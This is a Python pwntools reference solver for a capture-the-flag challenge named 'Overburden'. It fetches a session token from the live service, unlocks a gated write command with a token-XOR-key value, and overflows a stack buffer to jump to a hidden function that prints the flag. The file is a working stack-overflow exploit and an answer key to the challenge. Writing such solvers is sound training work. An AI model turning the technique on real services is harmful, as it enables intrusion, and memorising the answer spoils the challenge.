#!/usr/bin/env python3
# Overburden — reference solver (competitor's intended path).
#
# The vulnerable WRITE is GATED: the service issues a per-connection session
# token on IDENT, and WRITE only arms after you answer (token XOR KEY). The token
# lives only on the wire, so this is NOT solvable from the firmware file alone --
# you must interact with the live service. KEY and WIN are recovered by reversing
# the (stripped) firmware.
from pwn import *

HOST, PORT = args.HOST or 'localhost', int(args.PORT or 9000)
KEY    = 0x49434152        # XOR transform, recovered from handle_unlock
WIN    = 0x401317          # svc_dump_key (stripped; found via RE — it opens the flag file)
OFFSET = 88                # buf(rbp-0x50) -> saved RIP == 0x50 + 8

def frame(cmd, payload=b''):
    return b'RP' + p8(cmd) + p16(len(payload), endian='big') + payload

io = remote(HOST, PORT)

# 1) IDENT -> banner + per-session token (only observable live)
io.send(frame(0x10))
resp  = io.recv(timeout=1)
token = int(resp.split(b'SESSION=')[1][:8], 16)
log.info('session token: %#010x', token)

# 2) UNLOCK with token XOR KEY -> arms the WRITE path
io.send(frame(0x40, p32(token ^ KEY, endian='big')))
log.info('unlock: %s', io.recv(timeout=1).strip().decode(errors='replace'))

# 3) WRITE overflow -> ret2win to svc_dump_key -> flag
io.send(frame(0x30, b'TG' + b'A' * OFFSET + p64(WIN)))
io.recvuntil(b'flag{')
print('FLAG:', 'flag{' + io.recvuntil(b'}').decode())
io.close()
